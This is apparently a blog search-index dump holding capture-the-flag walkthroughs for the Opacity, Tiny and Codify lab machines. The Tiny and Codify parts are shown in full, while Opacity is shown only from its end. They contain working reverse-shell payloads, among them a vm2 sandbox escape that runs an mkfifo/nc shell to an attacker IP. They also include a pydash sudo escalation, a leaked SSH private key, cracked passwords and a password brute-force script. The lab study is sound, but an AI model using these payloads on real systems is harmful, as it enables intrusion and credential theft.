groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)sysadmin@opacity:/opt$ cd ~sysadmin@opacity:~$ ls -altotal 44drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22 2023 .drwxr-xr-x 3 root root 4096 Jul 26 2022 ..-rw------- 1 sysadmin sysadmin 22 Feb 22 2023 .bash_history-rw-r--r-- 1 sysadmin sysadmin 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25 2020 .bashrcdrwx------ 2 sysadmin sysadmin 4096 Jul 26 2022 .cachedrwx------ 3 sysadmin sysadmin 4096 Jul 28 2022 .gnupg-rw------- 1 sysadmin sysadmin 33 Jul 26 2022 local.txt-rw-r--r-- 1 sysadmin sysadmin 807 Feb 25 2020 .profiledrwxr-xr-x 3 root root 4096 Jul 8 2022 scriptsdrwx------ 2 sysadmin sysadmin 4096 Jul 26 2022 .ssh-rw-r--r-- 1 sysadmin sysadmin 0 Jul 28 2022 .sudo_as_admin_successfulsysadmin@opacity:~$```{: .nolineno}Now I noticed a directory named as scripts having root permission must be running as a cronjob so lets see what it is â†’```bashsysadmin@opacity:~$ cd scriptssysadmin@opacity:~/scripts$ lslib script.phpsysadmin@opacity:~/scripts$ ls -altotal 16drwxr-xr-x 3 root root 4096 Jul 8 2022 .drwxr-xr-x 7 sysadmin sysadmin 4096 Nov 17 10:21 ..drwxr-xr-x 2 sysadmin root 4096 Jul 26 2022 lib-rw-r----- 1 root sysadmin 519 Jul 8 2022 script.phpsysadmin@opacity:~/scripts$ cat script.php isDir() ? rmdir($file) : unlink($file); }}?>sysadmin@opacity:~/scripts$ ```{: .nolineno}It is besically having the backup functionality and File schedule removal for image upload , here in backup part it is executing `backup.inc.php` file lets see I can replace it with my reverse shell payload or not â†’```bashsysadmin@opacity:~/scripts/lib$ mv backup.inc.php backup.inc.php.baksysadmin@opacity:~/scripts/lib$ nano backup.inc.phpsysadmin@opacity:~/scripts/lib$ chmod +x backup.inc.phpsysadmin@opacity:~/scripts/lib$```{: .nolineno}Now I have to attempt to do some image uploading on that `http://10.10.33.169/cloud` that will trigger as a root user , and I will have a shell like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Opacity]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.33.169] 34656Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 10:29:01 up 37 min, 0 users, load average: 0.00, 0.00, 0.07USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=0(root) gid=0(root) groups=0(root)/bin/sh: 0: can not access tty; job control turned off# whoamiroot# iduid=0(root) gid=0(root) groups=0(root)# cd /root# ls -altotal 40drwx------ 5 root root 4096 Feb 22 2023 .drwxr-xr-x 19 root root 4096 Jul 26 2022 ..lrwxrwxrwx 1 root root 9 Jul 26 2022 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwxr-xr-x 3 root root 4096 Feb 22 2023 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw------- 1 root root 33 Jul 26 2022 proof.txt-rw-r--r-- 1 root root 66 Feb 22 2023 .selected_editordrwx------ 3 root root 4096 Feb 22 2023 snapdrwx------ 2 root root 4096 Jul 26 2022 .ssh-rw-r--r-- 1 root root 215 Feb 22 2023 .wget-hsts# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever2: eth0: mtu 9001 qdisc fq_codel state UP group default qlen 1000 link/ether 02:13:23:56:17:11 brd ff:ff:ff:ff:ff:ff inet 10.10.33.169/16 brd 10.10.255.255 scope global dynamic eth0 valid_lft 3157sec preferred_lft 3157sec inet6 fe80::13:23ff:fe56:1711/64 scope link valid_lft forever preferred_lft forever# hostnameopacity#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Tiny", "url": "/posts/Tiny/", "categories": "HackMyVM", "tags": "Port Forwarding, PrivEsc, SQLi, Shortcode, Wordpress, pspy64, socat", "date": "2023-11-10 00:00:00 +0530", "snippet": "HackMyVM Machine âž¡ï¸ Â Â Hard Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â #Port ForwardingÂ Â #SQLiÂ Â #ShortcodeÂ Â #WordpressÂ Â #pspy64Â Â #socatÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Port Scan Results âž¡ï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Tiny]â””â”€$ sudo ...", "content": "HackMyVM Machine âž¡ï¸ Â Â Hard Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â #Port ForwardingÂ Â #SQLiÂ Â #ShortcodeÂ Â #WordpressÂ Â #pspy64Â Â #socatÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Port Scan Results âž¡ï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Tiny]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.0.2.79 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 20:35 ISTNmap scan report for 10.0.2.79Host is up (0.0018s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)| ssh-hostkey: | 256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)|_ 256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)80/tcp open http Apache httpd 2.4.57|_http-title: Blog| http-robots.txt: 15 disallowed entries | /wp-admin/ /cgi-bin/ /private/ /temp/ /backup/ /old/ | /test/ /dev/ / /misc/ /downloads/ /doc/ /documents/ |_/restricted/ /confidential/|_http-server-header: Apache/2.4.57 (Debian)|_http-generator: WordPress 6.3.18888/tcp open http-proxy tinyproxy 1.11.1|_http-server-header: tinyproxy/1.11.1|_http-title: 403 Access deniedMAC Address: 08:00:27:C8:84:B1 (Oracle VirtualBox virtual NIC)Service Info: Host: tiny.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb Enumeration âž¡ï¸I loaded port 80 on browser and I got a wordpress file â†’I then ran wpscan and looked for the vulnerable plugins, themes, and usernames from this Tool â†’[i] User(s) Identified:[+] admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection)[+] umeko | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)I found 2 users â†’I tried to bruteforced the password for these 2 users using wpscan Tool but no luck ðŸ˜”.Now I found a subdomain for this host â†’I added the host name as wish.tiny.hmv and loaded this url and I got a login page where I have to enter the username and the wish so I tried different things and noticed about the sqli vulnerability in it â†’sqlmap -r req.txt --dumpAfter checking with sqlmap I got the output as â†’I cracked the password with online hashes.com site and got the cracked password as â†’{: .nolineno}umeko : fuckit!Now I loggedin into the wordpress site and I have limited resources to do only I can publish a post also while doing the enumeration on wpscan I noticed about a plugin called as OpenHook Plugin that is vulnerable to shortcode Injection that can lead to RCE from here â†’ExploitSo I tried to implement this exploit on this environment â†’[php]&lt;?php system('id') ?&gt;[/php]I changed the author name to admin and added this shortcode in Code Editor View then I updated the changes and loaded the URL â†’From above code I got this â†’Now I have command Execution functionality so lets have a reverse shell now â†’as a result I got this response â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Tiny]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.0.2.77] from (UNKNOWN) [10.0.2.79] 52822python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@tiny:/var/www/html$ whoamiwhoamiwww-datawww-data@tiny:/var/www/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@tiny:/var/www/html$From wp-config.php file I got these credentials â†’// ** Database settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wordpressdb' );/** Database username */define( 'DB_USER', 'wordpressuser' );/** Database password */define( 'DB_PASSWORD', '6rt443RKhwTXjWDe' );/** Database hostname */define( 'DB_HOST', 'localhost' );/** Database charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8mb4' );/** The database collate type. Do not change this if in doubt. */define( 'DB_COLLATE', '' );{: .nolineno}wordpressuser : 6rt443RKhwTXjWDeNow I looked into the network configurations and running ports and services and I got this â†’www-data@tiny:/var/www/html$ ss -tunlpss -tunlpNetid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcessudp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 1024 0.0.0.0:8888 0.0.0.0:* tcp LISTEN 0 511 127.0.0.1:8000 0.0.0.0:* tcp LISTEN 0 511 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 1024 [::]:8888 [::]:* www-data@tiny:/var/www/html$Now I transfered socat Tool and ran the Port Forwarding command so that I could find out about port 8000 â†’I checked any other running services through pspy64 Tool and I got this tinyproxy running noticed so I looked into its configuration files from here /etc/tinyproxy/tinyproxy.conf â†’www-data@tiny:/var/www/html$ cat /etc/tinyproxy/tinyproxy.conf | grep -v '#' | grep .cat /etc/tinyproxy/tinyproxy.conf | grep -v '#' | grep .User tinyproxyGroup tinyproxyPort 8888Timeout 600DefaultErrorFile \"/usr/share/tinyproxy/default.html\"StatFile \"/usr/share/tinyproxy/stats.html\"LogFile \"/var/log/tinyproxy/tinyproxy.log\"LogLevel InfoPidFile \"/run/tinyproxy/tinyproxy.pid\"Upstream http localhost:1111MaxClients 100Allow 127.0.0.1Allow ::1Allow 192.168.0.30ViaProxyName \"tinyproxy\"www-data@tiny:/var/www/html$from here I got to know that this proxy is sending a request on port 1111 so I started lisening on port 1111 and I got this response â†’www-data@tiny:/var/www/html$ nc -lvnp 1111nc -lvnp 1111listening on [any] 1111 ...connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43490GET http://127.0.0.1:8000/id_rsa HTTP/1.1Host: 127.0.0.1:8000Connection: closeVia: 1.1 tinyproxy (tinyproxy/1.11.1)Authorization: Basic cm9vdDpRMlg0OXQ0V2pzUser-Agent: curl/7.88.1Accept: */*Now I know that the private key file that is id_rsa file is being delived to port 8000 so I redirected the socat 8000 port to port 1111 so that the port 1111 will work as a lisener and also catches the output for id_rsa file â†’www-data@tiny:/tmp$ ./socat_x86 -v TCP-LISTEN:1111,reuseaddr,fork TCP:127.0.0.1:8000&lt;v TCP-LISTEN:1111,reuseaddr,fork TCP:127.0.0.1:8000-----BEGIN OPENSSH PRIVATE KEY-----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.....................................-----END OPENSSH PRIVATE KEY-----Now I terminated the socat as I got the private key and I will give its permissions as 600 and then use it for user vic â†’www-data@tiny:/tmp$ ssh -i id_rsa vic@localhostssh -i id_rsa vic@localhostThe authenticity of host 'localhost (::1)' cant be established.ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesyesCould not create directory '/var/www/.ssh' (Permission denied).Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).Linux tiny.hmv 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.[oh-my-zsh] Would you like to update? [Y/n] nn^J[oh-my-zsh] You can update manually by running `omz update`â•­â”€vic@tiny ~ â•°â”€$ â•­â”€vic@tiny ~ â•°â”€$ whoamiwhoamiwhoamivicâ•­â”€vic@tiny ~ â•°â”€$ id ididuid=1000(vic) gid=1000(vic) groups=1000(vic),100(users)â•­â”€vic@tiny ~ â•°â”€$Then I know the privileges that vic user has to be root â†’â•­â”€vic@tiny ~ â•°â”€$ sudo -lMatching Defaults entries for vic on tiny: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser vic may run the following commands on tiny: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/car.py*Lets see what is inside car.py file â†’â•­â”€vic@tiny ~ â•°â”€$ cat /opt/car.py 1 â†µimport sysimport randomimport pydashclass Car: def __init__(self, model, year): self.model = model self.year = year self.id = random.randint(1, 99999) def get_info(self, info_type): if info_type == \"model\": return self.model elif info_type == \"year\": return self.year elif info_type == \"id\": return self.iddef poc(path, arg): obj = Car('Sedan', 2011) res = pydash.objects.invoke(obj, path, arg) print(res)if __name__ == '__main__': if len(sys.argv) &lt; 3: print('Missing args: %s &lt;path&gt; &lt;arg&gt;' % sys.argv[0]) sys.exit(1) poc(sys.argv[1], sys.argv[2]) It uses module name like pydash and I searched on web and got to know about this exploit.This code requires 2 arguments so I will be using the exploit arguments like this :â•­â”€vic@tiny ~ â•°â”€$ sudo /usr/bin/python3 /opt/car.py __init__.__globals__.random._os.system iduid=0(root) gid=0(root) groups=0(root)0Now I used the Bash command to get the shell â†’â•­â”€vic@tiny ~ â•°â”€$ sudo /usr/bin/python3 /opt/car.py __init__.__globals__.random._os.system /bin/bashroot@tiny:/home/vic# whoamirootroot@tiny:/home/vic# iduid=0(root) gid=0(root) groups=0(root)root@tiny:/home/vic# cd ~root@tiny:~# ls -altotal 40drwx------ 6 root root 4096 Nov 10 16:04 .drwxr-xr-x 18 root root 4096 Jul 22 10:10 ..lrwxrwxrwx 1 root root 9 Jun 15 06:14 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 571 Sep 30 08:17 .bashrcdrwxr-xr-x 3 root root 4096 Sep 30 08:17 .cachedrwxr-xr-x 3 root root 4096 Oct 2 16:23 .localdrwxr-xr-x 12 root root 4096 Sep 30 08:17 .oh-my-zsh-rw-r--r-- 1 root root 162 Sep 30 08:17 .profile-rwx------ 1 root root 33 Sep 30 08:17 root.txtdrwx------ 2 root root 4096 Oct 2 14:15 .ssh-rw-r--r-- 1 root root 3890 Sep 30 08:17 .zshrcroot@tiny:~#I am Root Now !! If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "Codify", "url": "/posts/Codify/", "categories": "HackTheBox", "tags": "Node.js, Password Bruteforce, PrivEsc, Public Exploit, sqlite", "date": "2023-11-10 00:00:00 +0530", "snippet": "HackTheBox Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Node.js&nbsp;&nbsp;#sqlite&nbsp;&nbsp;#Password B...", "content": "HackTheBox Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Node.js&nbsp;&nbsp;#sqlite&nbsp;&nbsp;#Password Bruteforce&nbsp;&nbsp;#Public Exploit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Codify]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.239Warning: 10.10.11.239 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.11.239Host is up (0.20s latency).Not shown: 65474 closed tcp ports (reset), 56 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)|_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: Did not follow redirect to http://codify.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)3000/tcp open http Node.js Express framework|_http-title: Codify8080/tcp open tcpwrapped8081/tcp open blackice-icecap?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WWWOFFLEctrlstat, X11Probe: | HTTP/1.1 400 Bad Request| Connection: close| FourOhFourRequest, GetRequest: | HTTP/1.1 200 OK| Content-Type: text/plain| Date: Fri, 10 Nov 2023 09:08:23 GMT| Connection: close| loulou| HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK| Content-Type: text/plain| Date: Fri, 10 Nov 2023 09:08:30 GMT| Connection: close|_ loulou1 service unrecognized despite returning data.```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration âž¡ï¸I checked port 80 and and I redirected to codify.htb domain name so I set the /etc/hosts file and I got the webpage â†’![Untitled](Codify/Untitled%201.png)while enumeartion in about tab I noticed this VM2 library and recon on it futher more on it â†’![Untitled](Codify/Untitled%202.png)I found the same version of vm2 exploit from internet here it is â†’[https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)```jsconst {VM} = require(\"vm2\");const vm = new VM();const code = `err = {};const handler = { getPrototypeOf(target) { (function stack() { new Error().stack; stack(); })(); }}; const proxiedErr = new Proxy(err, handler);try { throw proxiedErr;} catch ({constructor: c}) { c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.201 4444 >/tmp/f');}`console.log(vm.run(code));```{: .nolineno}![Untitled](Codify/Untitled%203.png)Same way I can get the reverse shell from it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Codify]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.201] from (UNKNOWN) [10.10.11.239] 35584/bin/sh: 0: cant access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'svc@codify:~$ whoamiwhoamisvcsvc@codify:~$ ididuid=1001(svc) gid=1001(svc) groups=1001(svc)svc@codify:~$```{: .nolineno}while inner enumeration I got a file related to sqlite â†’```bashsvc@codify:/var/www/contact$ ls -alls -altotal 120drwxr-xr-x 3 svc svc 4096 Sep 12 17:45 .drwxr-xr-x 5 root root 4096 Sep 12 17:40 ..-rw-rw-r-- 1 svc svc 4377 Apr 19 2023 index.js-rw-rw-r-- 1 svc svc 268 Apr 19 2023 package.json-rw-rw-r-- 1 svc svc 77131 Apr 19 2023 package-lock.jsondrwxrwxr-x 2 svc svc 4096 Apr 21 2023 templates-rw-r--r-- 1 svc svc 20480 Sep 12 17:45 tickets.dbsvc@codify:/var/www/contact$svc@codify:/var/www/contact$ file tickets.dbfile tickets.dbtickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17svc@codify:/var/www/contact$```{: .nolineno}I then tranfered the `tickets.db` file into the attackers machine through wget and python3 server and opened that file with sqlite browser and I got some date through this â†’![Untitled](Codify/Untitled%204.png)Lets try to decode this password with hashcat Tool â†’![Untitled](Codify/Untitled%205.png)```{: .nolineno}joshua : spongebob1```{: .nolineno}I now Logged in as joshua and I executed `sudo -l` so that I can escalated the privileges to root user â†’```bashjoshua@codify:~$ ls -altotal 36drwxrwx--- 4 joshua joshua 4096 Nov 17 06:29 .drwxr-xr-x 4 joshua joshua 4096 Sep 12 17:10 ..lrwxrwxrwx 1 root root 9 May 30 12:08 .bash_history -> /dev/null-rw-r--r-- 1 joshua joshua 220 Apr 21 2023 .bash_logout-rw-r--r-- 1 joshua joshua 3771 Apr 21 2023 .bashrcdrwx------ 2 joshua joshua 4096 Sep 14 14:44 .cachedrwxrwxr-x 3 joshua joshua 4096 Nov 17 06:29 .local-rw-r--r-- 1 joshua joshua 807 Apr 21 2023 .profile-rw-r----- 1 root joshua 33 Nov 17 05:10 user.txt-rw-r--r-- 1 joshua joshua 39 Sep 14 14:45 .vimrcjoshua@codify:~$ cat user.txtfd1f48fd367fd2a139d6b12db7e6d881joshua@codify:~$joshua@codify:~$ sudo -l[sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.shjoshua@codify:~$```{: .nolineno}Lets look into `mysql-backup.sh` file â†’```bashjoshua@codify:~$ cat /opt/scripts/mysql-backup.sh#!/bin/bashDB_USER=\"root\"DB_PASS=$(/usr/bin/cat /root/.creds)BACKUP_DIR=\"/var/backups/mysql\"read -s -p \"Enter MySQL password for $DB_USER: \" USER_PASS/usr/bin/echoif [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo \"Password confirmed!\"else /usr/bin/echo \"Password confirmation failed!\" exit 1fi/usr/bin/mkdir -p \"$BACKUP_DIR\"databases=$(/usr/bin/mysql -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" -e \"SHOW DATABASES;\" | /usr/bin/grep -Ev \"(Database|information_schema|performance_schema)\")for db in $databases; do /usr/bin/echo \"Backing up database: $db\" /usr/bin/mysqldump --force -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" \"$db\" | /usr/bin/gzip > \"$BACKUP_DIR/$db.sql.gz\"done/usr/bin/echo \"All databases backed up successfully!\"/usr/bin/echo \"Changing the permissions\"/usr/bin/chown root:sys-adm \"$BACKUP_DIR\"/usr/bin/chmod 774 -R \"$BACKUP_DIR\"/usr/bin/echo 'Done!'```{: .nolineno}{: file='mysql-backup.sh'}>Here the content of `mysql-backup.sh` wants password to be verified for root user so for that there is a `==` comparison operator that will compair each characteres for the root user with input value so I have to create a automated bruteforce script , This script will try to compare each character with the root password. If a character matches, it will be added to another variable called password. Then the script will try the next character and repeat the process until there are no more characters left to match.{: .prompt-tip }I used chatGPT to create this python code â†’```pythonimport stringimport subprocessdef run_command(command): return subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdoutdef find_password(): all = list(string.ascii_letters + string.digits) password = \"\" found = False # This is a flag variable to indicate whether the password is found or not while not found: # This is the condition for the loop to repeat for character in all: output = run_command(f\"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh\") if \"Password confirmed!\" in output: password += character print(password) break else: # This is executed when the for loop ends without breaking found = True # This changes the flag variable to stop the while loop return passwordpassword = find_password()```{: .nolineno}{: file='brute.py'}Now lets see the result of this â†’```bashjoshua@codify:~$ python3 brute.py kklkljkljhkljh1kljh12kljh12kkljh12k3kljh12k3jkljh12k3jhkljh12k3jhakljh12k3jhaskljh12k3jhaskkljh12k3jhaskjkljh12k3jhaskjhkljh12k3jhaskjh1kljh12k3jhaskjh12kljh12k3jhaskjh12kkljh12k3jhaskjh12kjkljh12k3jhaskjh12kjhkljh12k3jhaskjh12kjh3joshua@codify:~$```{: .nolineno}Now I have this password for root user `kljh12k3jhaskjh12kjh3` Lets Login as root user â†’```bashjoshua@codify:~$ su rootPassword: root@codify:/home/joshua# cd ~root@codify:~# ls -altotal 40drwx------ 5 root root 4096 Sep 26 09:35 .drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..lrwxrwxrwx 1 root root 9 Sep 14 03:26 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrc-rw-r--r-- 1 root root 22 May 8 2023 .credsdrwxr-xr-x 3 root root 4096 Sep 26 09:35 .locallrwxrwxrwx 1 root root 9 Sep 14 03:34 .mysql_history -> /dev/null-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 33 Nov 17 05:10 root.txtdrwxr-xr-x 4 root root 4096 Sep 12 16:56 scriptsdrwx------ 2 root root 4096 Sep 14 03:31 .ssh-rw-r--r-- 1 root root 39 Sep 14 03:26 .vimrcroot@codify:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft 